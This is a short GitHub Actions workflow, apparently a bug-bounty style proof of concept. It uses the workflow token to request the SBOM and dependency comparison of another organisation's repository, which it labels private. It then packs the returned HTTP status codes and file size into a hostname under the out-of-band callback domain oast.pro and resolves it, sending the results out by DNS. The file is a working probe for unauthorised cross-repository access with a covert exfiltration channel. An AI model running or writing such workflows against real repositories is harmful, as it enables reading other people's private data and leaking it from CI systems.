name: sbomx
on:
  workflow_dispatch:
permissions:
  contents: read
jobs:
  s:
    runs-on: ubuntu-latest
    steps:
      - name: private repo SBOM from public token
        env:
          TOKEN: ${{ github.token }}
        run: |
          B=https://api.github.com
          A="Authorization: Bearer $TOKEN"
          H="Accept: application/vnd.github+json"
          C1=$(curl -s -o /tmp/s.json -w '%{http_code}' -H "$A" -H "$H" "$B/repos/tooforg/invisible-repo/dependency-graph/sbom")
          C2=$(curl -s -o /dev/null -w '%{http_code}' -H "$A" -H "$H" "$B/repos/tooforg/invisible-repo/dependency-graph/compare/main...main")
          SZ=$(wc -c < /tmp/s.json)
          getent hosts "sb${C1}x${C2}y${SZ}ro4yhyiy8bnjaqqlmuqb570heqpl3zl7z.oast.pro" > /dev/null 2>&1 || true
